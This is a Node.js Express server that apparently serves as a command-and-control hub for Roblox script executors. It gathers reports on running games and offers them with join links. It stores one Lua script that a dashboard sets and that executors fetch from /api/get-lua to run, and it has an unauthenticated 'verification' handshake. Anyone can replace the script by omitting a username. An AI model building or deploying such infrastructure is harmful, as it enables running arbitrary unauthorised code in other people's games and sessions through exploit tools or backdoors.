const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.text({ type: 'text/plain' }));

// In‑memory storage
const games = new Map();                // key: placeId → game object
let currentLuaScript = "print('hello world')";

// Verification storage
const verificationRequests = new Map(); // key: username → { status: 'pending'|'verified', confirmedAt, playerInfo }

// ========================
// Game reporting
// ========================
app.post('/api/report', (req, res) => {
  const game = req.body;
  if (!game.id && !game.placeId) {
    return res.status(400).json({ error: 'Missing placeId' });
  }

  const placeId = game.id || game.placeId;
  const playing = game.players || game.playing || 0;

  const storedGame = {
    placeId: placeId,
    name: game.name || '',
    playing: playing,
    visits: game.visits || '',
    creator: game.creator || '',
    creator_id: game.creator_id || '',
    maxPlayers: game.max_players || '',
    genre: game.genre || '',
    created: game.created || '',
    voice: game.voice || '',
    rig: game.rig || '',
    joinUrl: `https://www.roblox.com/games/${placeId}/-`,
    reportedAt: Date.now()
  };

  games.set(placeId, storedGame);
  res.json({ success: true });
});

app.get('/api/games', (req, res) => {
  const now = Date.now();
  const oneHour = 60 * 60 * 1000;
  const activeGames = Array.from(games.values())
    .filter(g => g.playing > 0 && (now - g.reportedAt) < oneHour)
    .sort((a, b) => b.playing - a.playing);
  res.json(activeGames);
});

// ========================
// Script endpoints
// ========================
app.post('/api/set-script', (req, res) => {
  const { script, username } = req.body;
  if (typeof script !== 'string') {
    return res.status(400).json({ error: 'Missing script' });
  }

  // Optional: enforce verification
  if (username) {
    const vr = verificationRequests.get(username);
    if (!vr || vr.status !== 'verified') {
      return res.status(403).json({ error: 'Player not verified' });
    }
  }

  currentLuaScript = script;
  res.json({ success: true });
});

app.get('/api/get-script', (req, res) => {
  res.json({ script: currentLuaScript });
});

app.get('/api/get-lua', (req, res) => {
  res.type('text/plain').send(currentLuaScript);
});

// ========================
// Verification endpoints
// ========================
// Request verification for a username (from dashboard)
app.post('/api/request-verification', (req, res) => {
  const { username } = req.body;
  if (!username || typeof username !== 'string') {
    return res.status(400).json({ error: 'Username required' });
  }
  verificationRequests.set(username, { status: 'pending', requestedAt: Date.now() });
  res.json({ success: true });
});

// Check verification status (from dashboard)
app.get('/api/check-verification', (req, res) => {
  const { username } = req.query;
  if (!username) return res.status(400).json({ error: 'Username required' });
  const vr = verificationRequests.get(username);
  res.json({
    verified: vr?.status === 'verified',
    status: vr?.status || 'none'
  });
});

// Get pending verification request (called by Lua executor)
app.get('/api/pending-verification', (req, res) => {
  // Return the first pending request (could be improved with a queue)
  for (const [username, vr] of verificationRequests.entries()) {
    if (vr.status === 'pending') {
      return res.json({ username, requested: true });
    }
  }
  res.json({ requested: false });
});

// Confirm verification (called by Lua executor when player matches)
app.post('/api/confirm-verification', (req, res) => {
  const { username, playerName, userId } = req.body;
  if (!username) return res.status(400).json({ error: 'Username required' });
  const vr = verificationRequests.get(username);
  if (!vr) return res.status(404).json({ error: 'No pending request for this username' });
  if (vr.status === 'verified') return res.json({ already: true });

  // Mark as verified
  vr.status = 'verified';
  vr.confirmedAt = Date.now();
  vr.playerInfo = { name: playerName, userId };
  res.json({ success: true });
});

// Cleanup old games and verification requests
setInterval(() => {
  const now = Date.now();
  const oneHour = 60 * 60 * 1000;
  for (const [placeId, game] of games) {
    if (now - game.reportedAt > oneHour) games.delete(placeId);
  }
  for (const [username, vr] of verificationRequests) {
    if (now - vr.requestedAt > 10 * 60 * 1000) { // expire after 10 minutes
      verificationRequests.delete(username);
    }
  }
}, 60 * 1000);

app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
